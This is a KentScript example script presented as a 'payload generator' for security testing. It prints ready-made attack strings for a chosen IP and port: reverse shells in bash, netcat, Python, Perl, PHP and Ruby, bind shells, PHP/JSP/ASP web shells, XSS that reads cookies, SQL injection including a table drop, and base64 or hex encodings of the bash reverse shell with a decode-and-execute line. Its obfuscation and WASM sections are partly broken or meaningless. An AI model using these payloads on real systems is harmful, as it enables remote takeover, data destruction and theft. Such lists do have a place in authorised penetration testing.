:: Payload Generator - Generate various security testing payloads
:: Usage: python3 main.py run examples/payload_gen.ks --type <type> [--output <file>]

import argparse;
import crypto;
import json;

let parser = system_argparse_new("KentScript Payload Generator v1.0");
system_argparse_add_argument(parser, "--type");
system_argparse_add_argument(parser, "--ip");
system_argparse_add_argument(parser, "--port");
system_argparse_add_argument(parser, "--cmd");
system_argparse_add_argument(parser, "--output");
system_argparse_add_argument(parser, "--format");

let args = system_argparse_parse_args(parser, []);

let payload_type = "shell";
if args.type != none {
    payload_type = str(args.type).lower();
}

let ip = "127.0.0.1";
if args.ip != none {
    ip = str(args.ip);
}

let port = "4444";
if args.port != none {
    port = str(args.port);
}

let cmd = "/bin/sh";
if args.cmd != none {
    cmd = str(args.cmd);
}

let output_file = none;
if args.output != none {
    output_file = str(args.output);
}

print(f"[*] KentScript Payload Generator v1.0");
print(f"[*] Type: {payload_type}");
print("");

let payload = "";

if payload_type == "shell" or payload_type == "reverse" {
    print("[*] Reverse Shell Payloads");
    print("");

    :: Bash reverse shell
    let bash_sh = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1";
    print("=== Bash Reverse Shell ===");
    print(bash_sh);
    print("");

    :: Netcat reverse shell
    let nc_sh = f"nc -e {cmd} {ip} {port}";
    print("=== Netcat Reverse Shell ===");
    print(nc_sh);
    print("");

    :: Python reverse shell
    let py_sh = f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"{cmd}\")'";
    print("=== Python Reverse Shell ===");
    print(py_sh);
    print("");

    :: Perl reverse shell
    let perl_sh = f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"{cmd} -i\");}};'";
    print("=== Perl Reverse Shell ===");
    print(perl_sh);
    print("");

    :: PHP reverse shell
    let php_sh = f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"{cmd} -i <&3 >&3 2>&3\");'";
    print("=== PHP Reverse Shell ===");
    print(php_sh);
    print("");

    :: Ruby reverse shell
    let ruby_sh = f"ruby -rsocket -e 'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"{cmd} -i <&%d >&%d 2>&%d\",f,f,f)'";
    print("=== Ruby Reverse Shell ===");
    print(ruby_sh);
    print("");

    payload = bash_sh;

} elif payload_type == "bind" {
    print("[*] Bind Shell Payloads");
    print("");

    :: Netcat bind shell
    let nc_bind = f"nc -l -p {port} -e {cmd}";
    print("=== Netcat Bind Shell ===");
    print(nc_bind);
    print("");

    :: Python bind shell
    let py_bind = f"python3 -c 'import socket,os,pty,thread;s=socket.socket();s.bind((\"0.0.0.0\",{port}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);pty.spawn(\"{cmd}\")'";
    print("=== Python Bind Shell ===");
    print(py_bind);
    print("");

    payload = nc_bind;

} elif payload_type == "web" {
    print("[*] Web Payloads");
    print("");

    :: PHP cmd
    let php_cmd = f"<?php system($_GET['cmd']); ?>";
    print("=== PHP Command Execution ===");
    print(php_cmd);
    print("");

    :: JSP cmd
    let jsp_cmd = "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>";
    print("=== JSP Command Execution ===");
    print(jsp_cmd);
    print("");

    :: ASP cmd
    let asp_cmd = "<% Response.Write(CreateObject(\"WScript.Shell\").Exec(Request.QueryString(\"cmd\")).StdOut.ReadAll()) %>";
    print("=== ASP Command Execution ===");
    print(asp_cmd);
    print("");

    :: Python Flask SSTI
    let flask_ssti = "{{ ''.__class__.__mro__[1].__subclasses__() }}";
    print("=== Flask SSTI Test ===");
    print(flask_ssti);
    print("");

    :: XSS Payloads
    let xss_payloads = [
        "<script>alert(document.domain)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "javascript:alert(document.cookie)"
    ];
    print("=== XSS Payloads ===");
    for xp in xss_payloads {
        print(xp);
    }
    print("");

    :: SQL Injection Payloads
    let sql_payloads = [
        "' OR '1'='1",
        "' OR 1=1--",
        "admin'--",
        "1' AND '1'='1",
        "1 UNION SELECT NULL--",
        "'; DROP TABLE users--"
    ];
    print("=== SQL Injection Payloads ===");
    for sp in sql_payloads {
        print(sp);
    }
    print("");

    payload = php_cmd;

} elif payload_type == "wasm" {
    print("[*] WebAssembly Payloads");
    print("");

    let wasm_sh = f"(module (func (export \"_start\") (param i32 i32) (result i32) (local.get 0) (i32.const 1) (call_indirect (type 0))))";
    print("=== Basic WASM Module ===");
    print(wasm_sh);
    print("");

    let wasm_shell = f"\\x00\\x61\\x73\\x6d\\x01\\x00\\x00\\x00";
    print("=== WASM Shellcode (hex) ===");
    print(wasm_shell);
    print("");

    payload = wasm_sh;

} elif payload_type == "base64" {
    print("[*] Base64 Encoded Payloads");
    print("");

    let raw_payload = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1";
    let encoded = system_crypto_base64_encode(raw_payload);
    print(f"=== Base64 Encoded ===");
    print(encoded);
    print("");

    :: Decode and execute
    let decode_cmd = f"echo {encoded} | base64 -d | bash";
    print("=== Execute Command ===");
    print(decode_cmd);
    print("");

    payload = encoded;

} elif payload_type == "hex" {
    print("[*] Hex Encoded Payloads");
    print("");

    let raw_payload = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1";
    let hex_encoded = "";
    for c in raw_payload {
        let hex_c = system_builtin_hex(system_builtin_ord(c));
        hex_encoded = hex_encoded + str(hex_c).replace("0x", "");
    }
    print("=== Hex Encoded ===");
    print(hex_encoded);
    print("");

    payload = hex_encoded;

} elif payload_type == "obfuscate" {
    print("[*] Obfuscated Payloads");
    print("");

    :: Bash variable obfuscation
    let obs_bash = f"${{_}} ${{_}} {{{{{{{_}}}}}}>&{{_}}".len();
    print("[!] Variable Obfuscation - complex");
    print(f"${{_}}eval${{_}}...");
    print("");

    :: XOR encoded
    let xor_key = system_crypto_random_bytes(1)[0];
    print(f"[!] XOR Encoded (key: {xor_key})");
    print(f"echo '{payload_type}' | xxd -p | sed 's/../\\\\x&/g' | xxd -r -p | bash");
    print("");

} elif payload_type == "format" {
    print("[*] Format String Payloads");
    print("");

    let fmt_payloads = [
        "%s%s%s%s%s%s",
        "%x.%x.%x.%x.%x.%x.%x.%x",
        "%p.%p.%p.%p.%p.%p.%p.%p",
        "{{7*7}}",
        "{{7*'7'}}",
        "{{config}}",
        "{{request}}"
    ];
    
    print("=== Format String Payloads ===");
    for fp in fmt_payloads {
        print(fp);
    }
    print("");

    payload = fmt_payloads[0];

} else {
    print(f"[!] Unknown payload type: {payload_type}");
    print("Available types: shell, bind, web, wasm, base64, hex, obfuscate, format");
    system_os_exit(1);
}

:: Save to file if requested
if output_file != none {
    system_file_write_text(output_file, payload);
    print(f"[*] Payload saved to: {output_file}");
}

print("");
print("[*] Generation complete");
